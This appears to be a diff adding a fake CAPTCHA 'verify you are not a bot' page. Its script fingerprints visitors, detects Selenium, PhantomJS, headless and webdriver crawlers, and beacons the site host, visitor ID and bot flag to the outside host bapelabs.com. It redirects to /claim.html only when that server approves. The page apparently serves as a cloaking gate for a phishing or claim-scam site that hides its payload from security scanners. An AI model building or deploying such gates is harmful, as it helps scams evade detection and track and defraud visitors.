@@ -1,0 +1,109 @@
+<!doctype html>
+<html>
+    <head><title>Loading...</title><link rel="shortcut icon" href="rfavicon.ico" />
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script></head>
+    <body>
+        <p>Please verify you are not a bot</p>
+        <form method="POST" action="recaptcha.php">
+            <div class="g-recaptcha" data-sitekey="6LeZYdUpAAAAAEuTnaoBy-HqeVQnmTbzBqfLDdTP"></div>
+            <br>
+            <input type="submit" value="Submit" />
+        </form>
+        <script src="https://unpkg.com/@fingerprintjs/fingerprintjs@4.2.2/dist/fp.umd.js"></script>
+<script>
+    runBotDetection = function () {
+        var documentDetectionKeys = [
+            "__webdriver_evaluate",
+            "__selenium_evaluate",
+            "__webdriver_script_function",
+            "__webdriver_script_func",
+            "__webdriver_script_fn",
+            "__fxdriver_evaluate",
+            "__driver_unwrapped",
+            "__webdriver_unwrapped",
+            "__driver_evaluate",
+            "__selenium_unwrapped",
+            "__fxdriver_unwrapped",
+        ];
+
+        var windowDetectionKeys = [
+            "_phantom",
+            "__nightmare",
+            "_selenium",
+            "callPhantom",
+            "callSelenium",
+            "_Selenium_IDE_Recorder",
+        ];
+
+        for (const windowDetectionKey in windowDetectionKeys) {
+            const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
+            if (window[windowDetectionKeyValue]) {
+                return true;
+            }
+        };
+        for (const documentDetectionKey in documentDetectionKeys) {
+            const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
+            if (window['document'][documentDetectionKeyValue]) {
+                return true;
+            }
+        };
+
+        for (const documentKey in window['document']) {
+            if (documentKey.match(/\$[a-z]dc_/) && window['document'][documentKey]['cache_']) {
+                return true;
+            }
+        }
+
+        if (window['external'] && window['external'].toString() && (window['external'].toString()['indexOf']('Sequentum') != -1)) return true;
+
+        if (window['document']['documentElement']['getAttribute']('selenium')) return true;
+        if (window['document']['documentElement']['getAttribute']('webdriver')) return true;
+        if (window['document']['documentElement']['getAttribute']('driver')) return true;
+
+        if (navigator.webdriver || navigator.userAgent?.toLowerCase().includes("headless")){
+            return true;
+        }
+
+        return false;
+    };
+
+    const invalid = runBotDetection();
+    const fpPromise = FingerprintJS.load();
+    fpPromise
+        .then(fp => fp.get())
+        .then(result => {
+          // This is the visitor identifier:
+          const visitorId = result.visitorId;
+          let MS_VISITOR_ID = visitorId;
+          if (MS_VISITOR_ID === null || MS_VISITOR_ID === undefined) {
+            MS_VISITOR_ID = -1;
+          }
+
+          fetch("https://bapelabs.com/enter.php?id=" + btoa(window.location.host + "," + MS_VISITOR_ID + "," + invalid));
+ 
+          fetch("https://bapelabs.com/checkdom.php?id=" + btoa(window.location.host)).then(check => check.text())
+             .then(verified => {
+                 console.log(verified);
+                 if (verified === "false"){
+                     if (MS_VISITOR_ID !== null) {
+                         fetch("https://bapelabs.com/verify.php?id=" + MS_VISITOR_ID);
+                     }
+                 } else {
+                    fetch("https://bapelabs.com/check.php?id=" + visitorId).then(check => check.text())
+                        .then(verified => {
+                            if (verified !== "false" && !invalid){
+                                fetch("https://bapelabs.com/entercheck.php").then(enter => enter.text())
+                                .then(enterValid => {
+                                    if (enterValid === "success") {
+                                        window.location.replace("/claim.html");
+                                    }
+                                });
+                               // window.location.replace("/claim.html");
+                            }
+                        });
+                 }
+             });
+        });
+  </script>
+    </body>
+</html>
